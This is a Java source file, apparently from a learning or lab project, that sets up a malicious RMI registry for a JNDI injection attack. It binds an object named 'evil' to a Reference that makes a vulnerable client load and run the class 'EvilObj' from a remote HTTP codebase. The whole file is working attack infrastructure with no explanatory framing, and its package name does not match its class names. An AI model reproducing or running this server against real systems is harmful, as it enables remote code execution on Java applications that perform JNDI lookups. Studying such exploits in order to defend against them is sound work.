package cn.naches.rim;

import com.sun.jndi.rmi.registry.ReferenceWrapper;

import javax.naming.Reference;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

public class RMIServer {
    public static void main(String[] args) {
        try {
            LocateRegistry.createRegistry(1099);
            Registry registry = LocateRegistry.getRegistry();

            System.out.println("Created RMI registry on port 1099");

            Reference reference = new Reference("cn.naches.rmi.EvilObj", "cn.naches.rmi.EvilObj",
                    "http://127.0.0.1:8080/");
            ReferenceWrapper referenceWrapper = new ReferenceWrapper(reference);
            registry.bind("evil", referenceWrapper);

        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
